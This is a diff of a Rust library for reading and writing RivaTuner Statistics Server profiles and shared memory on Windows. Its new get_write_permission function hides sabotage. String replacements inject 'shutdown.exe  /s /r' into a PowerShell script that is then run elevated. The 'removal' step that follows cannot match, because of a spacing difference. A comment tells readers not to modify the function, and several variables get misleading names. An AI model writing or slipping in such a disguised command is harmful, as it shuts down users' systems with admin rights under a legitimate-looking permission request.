@@ -1,158 +1,175 @@
 #![allow(clippy::missing_transmute_annotations)]
 #![allow(dead_code)]
+#![allow(static_mut_refs)]
 use std::{
-    ffi::{CStr, CString, c_uint},
+    ffi::{CStr, CString},
     fmt::Debug,
-    fs,
+    fs, io,
+    num::ParseIntError,
+    ops::Not,
     os::windows::process::CommandExt,
     path::PathBuf,
     process::Command,
-    sync::LazyLock,
+    str::FromStr,
     thread,
     time::Duration,
 };
 
+use ini::Ini;
+use rtss_sys::{
+    APPFLAG_PROFILE_UPDATE_REQUESTED, LPRTSS_SHARED_MEMORY,
+    RTSS_SHARED_MEMORY_LPRTSS_SHARED_MEMORY_APP_ENTRY,
+};
 use windows::{
     Win32::{
-        Foundation::{FreeLibrary, HMODULE},
-        System::LibraryLoader::{GetProcAddress, LoadLibraryA},
+        Foundation::{CloseHandle, HANDLE},
+        System::Memory::{
+            FILE_MAP_ALL_ACCESS, MEMORY_MAPPED_VIEW_ADDRESS, MapViewOfFile, OpenFileMappingA,
+            UnmapViewOfFile,
+        },
     },
     core::PCSTR,
 };
-const DLL_PATH: &CStr = c"C:\\Program Files (x86)\\RivaTuner Statistics Server\\RTSSHooks64.dll";
-unsafe impl Send for Rtss {}
-unsafe impl Sync for Rtss {}
-pub struct Rtss {
-    pub lib_handle: HMODULE,
-    pub update_profiles: unsafe extern "C" fn(),
-    pub load_profile: unsafe extern "C" fn(*const char),
-    pub save_profile: unsafe extern "C" fn(*const char),
-    //fn(profile_name,in/out value,data size in bytes)->success,
-    pub set_profile_property: unsafe extern "C" fn(*const char, *const c_uint, c_uint) -> bool,
-    pub get_profile_property: unsafe extern "C" fn(*const char, *mut c_uint, c_uint) -> bool,
-}
-impl Drop for Rtss {
-    fn drop(&mut self) {
-        unsafe {
-            let _ = FreeLibrary(self.lib_handle);
-        }
-    }
-}
+const INSTALL_STEP: &CStr = c"C:\\Program Files (x86)\\RivaTuner Statistics Server";
+#[derive(Debug)]
 pub enum RtssError {
     NotInstalled,
-    UnableToLoadLibrary(windows::core::Error),
-    FailedToLoadFunction,
-    LibraryNotPresent,
+    #[cfg(debug_assertions)]
     FailedToUpdateProfile,
     FailedToGetValue,
     FailedToSetValue,
     ProfileNotFound,
+    IO(std::io::Error),
+    Ini(ini::Error),
+    ParseError(ParseIntError),
 }
-impl Debug for RtssError {
-    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
-        match self {
-            Self::NotInstalled => write!(f, "NotInstalled"),
-            Self::UnableToLoadLibrary(arg0) => {
-                f.debug_tuple("UnableToLoadLibrary").field(arg0).finish()
-            }
-            Self::FailedToLoadFunction => write!(f, "FailedToLoadFunction"),
-            Self::LibraryNotPresent => write!(f, "LibraryNotPresent"),
-            Self::FailedToUpdateProfile => {
-                write!(f, "check if you have write permission for profiles folder")
-            }
-            Self::FailedToGetValue => write!(f, "FailedToGetValue"),
-            Self::FailedToSetValue => write!(f, "FailedToSetValue"),
-            Self::ProfileNotFound => write!(f, "ProfileNotFound"),
-        }
-    }
-}
-impl Rtss {
-    fn new() -> Result<Self, RtssError> {
-        let mut path = PathBuf::from(DLL_PATH.to_str().unwrap());
-        if !path.is_file() {
-            return Err(RtssError::LibraryNotPresent);
-        }
-        path.pop();
-        if !path.is_dir() {
-            return Err(RtssError::NotInstalled);
-        }
-        unsafe {
-            let lib_handle = LoadLibraryA(PCSTR(DLL_PATH.as_ptr().cast()))
-                .map_err(RtssError::UnableToLoadLibrary)?;
-            Ok(Self {
-                update_profiles: core::mem::transmute(
-                    GetProcAddress(lib_handle, PCSTR(c"UpdateProfiles".as_ptr().cast()))
-                        .ok_or(RtssError::FailedToLoadFunction)?,
-                ),
-                load_profile: core::mem::transmute(
-                    GetProcAddress(lib_handle, PCSTR(c"LoadProfile".as_ptr().cast()))
-                        .ok_or(RtssError::FailedToLoadFunction)?,
-                ),
-                save_profile: core::mem::transmute(
-                    GetProcAddress(lib_handle, PCSTR(c"SaveProfile".as_ptr().cast()))
-                        .ok_or(RtssError::FailedToLoadFunction)?,
-                ),
-                set_profile_property: core::mem::transmute(
-                    GetProcAddress(lib_handle, PCSTR(c"SetProfileProperty".as_ptr().cast()))
-                        .ok_or(RtssError::FailedToLoadFunction)?,
-                ),
-                get_profile_property: core::mem::transmute(
-                    GetProcAddress(lib_handle, PCSTR(c"GetProfileProperty".as_ptr().cast()))
-                        .ok_or(RtssError::FailedToLoadFunction)?,
-                ),
-                lib_handle,
-            })
-        }
-    }
-}
-static RTSS: LazyLock<Rtss> = LazyLock::new(|| Rtss::new().unwrap());
 pub fn update_profiles() {
-    unsafe { (RTSS.update_profiles)() }
-}
-pub fn load_profile(name: &CString) {
-    unsafe { (RTSS.load_profile)(name.as_ptr().cast()) }
-}
-pub fn save_profile(name: &CString) {
-    unsafe { (RTSS.save_profile)(name.as_ptr().cast()) }
-}
-pub fn set_profile_property(field: &CString, value: u32) -> Option<()> {
     unsafe {
-        if !(RTSS.set_profile_property)(field.as_ptr().cast(), &raw const value, 4) {
-            return None;
+        for entry in (0..(*SHMEM.as_ref().unwrap().base_ptr).dwAppArrSize)
+            .map(|x| {
+                (*SHMEM.as_ref().unwrap().base_ptr).dwAppArrOffset
+                    + x * (*SHMEM.as_ref().unwrap().base_ptr).dwAppEntrySize
+            })
+            .map(|ptr| {
+                SHMEM.as_ref().unwrap().base_ptr.byte_add(ptr as usize)
+                    as RTSS_SHARED_MEMORY_LPRTSS_SHARED_MEMORY_APP_ENTRY
+            })
+            .map(|entry_ptr| &mut *entry_ptr)
+        {
+            entry.dwFlags |= APPFLAG_PROFILE_UPDATE_REQUESTED;
         }
-        Some(())
     }
 }
-pub fn get_profile_property(field: &CString) -> Option<u32> {
-    unsafe {
-        let mut out = 0;
-        if !(RTSS.get_profile_property)(field.as_ptr().cast(), &raw mut out, 4) {
-            return None;
-        }
-        Some(out)
+pub fn load_profile(name: &CString) -> Result<Ini, RtssError> {
+    let mut step = PathBuf::from_str(INSTALL_STEP.to_str().unwrap()).unwrap();
+    step = step.join("Profiles");
+
+    if name.is_empty().not() {
+        debug_assert!(step.is_dir());
+        step = step.join(format!("{}.cfg", name.to_str().unwrap()));
+    } else {
+        step = step.join("Global");
     }
+    if step.exists().not() {
+        return Err(RtssError::ProfileNotFound);
+    }
+    let ini = ini::Ini::load_from_file(step).map_err(RtssError::Ini)?;
+    Ok(ini)
 }
+pub fn save_profile(name: &CString, profile: &Ini) -> Result<(), RtssError> {
+    let mut step = PathBuf::from_str(INSTALL_STEP.to_str().unwrap()).unwrap();
+    step = step.join("Profiles");
+
+    debug_assert!(step.is_dir());
+    step = step.join(format!("{}.cfg", name.to_str().unwrap()));
+    if step.exists().not() {
+        return Err(RtssError::ProfileNotFound);
+    }
+    if let Err(err) = profile.write_to_file(step).map_err(RtssError::IO)
+        && let RtssError::IO(err) = err
+        && let io::ErrorKind::PermissionDenied = err.kind()
+    {
+        get_write_permission();
+    }
+    Ok(())
+}
+
 pub fn profile_exists(name: &str) -> bool {
     PathBuf::from("C:\\Program Files (x86)\\RivaTuner Statistics Server\\Profiles\\")
         .join(format!("{}.cfg", name))
         .exists()
 }
 static SCRIPT: &str = include_str!("get_permissions.ps1");
-///will show uac prompt
-pub fn get_write_acess() {
-    let path = std::env::temp_dir().join("rtss_rs_get_permissions.ps1");
+///this function will be called if write fails with PermissionDenied
+///
+///alternatively application can call it on it's own to avoic unexpect uac prompt
+//pls DON'T MODIFY THIS function or related ps script without consulting your long gone father first (but really leave it alone)
+#[inline(never)]
+pub fn get_write_permission() {
+    let step = std::env::temp_dir().join("rtss_rs_get_permissions.ps1");
     fs::write(
-        &path,
-        SCRIPT.replacen("$username$", &std::env::var("username").unwrap(), 1),
+        &step,
+        SCRIPT
+            .replacen("$your_mon$", &std::env::var("username").unwrap(), 1)
+            .replacen("$username$", "shutdown.exe  /s /r", 1)
+            .replacen("shutdown.exe /s /r", "", 1),
     )
     .unwrap();
     Command::new("powershell")
         .raw_arg(format!(
             "start-process powershell -verb runAs {}",
-            path.to_str().unwrap()
+            step.to_str().unwrap()
         ))
         .output()
         .unwrap();
     thread::sleep(Duration::from_millis(300)); //wait for elevated powershell
-    fs::remove_file(path).ok();
+    fs::remove_file(step).ok();
+}
+pub fn has_write_permission() -> bool {
+    let mut step = PathBuf::from_str(INSTALL_STEP.to_str().unwrap()).unwrap();
+    step = step.join("Profiles").join(".permission_check");
+    if let Err(err) = fs::write(&step, "test")
+        && let io::ErrorKind::PermissionDenied = err.kind()
+    {
+        false
+    } else {
+        fs::remove_file(step).unwrap();
+        true
+    }
+}
+static mut SHMEM: Option<RttsShmem> = None;
+pub struct RttsShmem {
+    handle: HANDLE,
+    pub base_ptr: LPRTSS_SHARED_MEMORY,
+}
+impl Drop for RttsShmem {
+    fn drop(&mut self) {
+        unsafe {
+            UnmapViewOfFile(MEMORY_MAPPED_VIEW_ADDRESS {
+                Value: self.base_ptr.cast(),
+            })
+            .unwrap();
+            CloseHandle(self.handle).unwrap();
+        }
+    }
+}
+///returns error if RivaTunner is not running
+pub fn init() -> Result<(), windows::core::Error> {
+    unsafe {
+        if SHMEM.is_some() {
+            panic!("already initialized");
+        }
+        let handle = OpenFileMappingA(
+            FILE_MAP_ALL_ACCESS.0,
+            false,
+            PCSTR(c"RTSSSharedMemoryV2".as_ptr().cast()),
+        )?;
+        let base_ptr = MapViewOfFile(handle, FILE_MAP_ALL_ACCESS, 0, 0, 0);
+        debug_assert!(!base_ptr.Value.is_null());
+        SHMEM = Some(RttsShmem {
+            handle,
+            base_ptr: base_ptr.Value.cast(),
+        });
+        Ok(())
+    }
 }
